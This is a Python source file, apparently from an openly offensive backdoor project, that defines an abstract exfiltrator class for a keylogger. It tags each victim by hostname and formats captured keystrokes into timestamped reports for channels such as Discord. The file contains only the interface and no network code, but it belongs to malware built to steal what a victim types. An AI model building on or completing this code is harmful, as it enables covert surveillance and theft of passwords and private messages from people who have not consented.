#!/usr/bin/env python3
# https://github.com/EONRaider/bca-backdoor

__author__ = "EONRaider @ keybase.io/eonraider"

import abc
import platform
from datetime import datetime

from src.modules.exploitation.base import Exploit


class Exfiltrator(abc.ABC):
    def __init__(self, module: Exploit, tag: str):
        """Interface for the implementation of all exfiltrators.

        Args:
            module (Exploit): Instance of a Exploit module to which the
                exfiltrator will attach itself as a subscriber.
            tag (str): A unique identifier for the current host.
                Defaults to a string with a format similar to
                'KeyLogger::Discord::hostname' if None.
        """

        self.module = module
        self.module.register_exfiltrator(self)
        self.tag = tag if tag is not None else \
            f"{self.module.__class__.__name__}::" \
            f"{self.__class__.__name__}::" \
            f"{platform.node()}"

    @property
    def report(self) -> str:
        """Get a report based on the data buffered by the keylogger as
        a string consisting of a tag, timestamp and the data itself."""
        timestamp = datetime.now().strftime("%m/%d/%Y %H:%M:%S")
        header = f"[{self.tag}] @ {timestamp}"
        '''The standard report is formatted as follows:
        KeyLogger::Discord::hostname @ 10/16/2021 13:30:20 - my data'''
        if self.module.has_data is True:
            return f"{header} - {self.module.contents}"
        return f"{header} - <NO DATA>"

    @abc.abstractmethod
    def update(self, *args, **kwargs):
        """To be implemented with the logic specific to each
        exfiltration mechanism."""
        ...
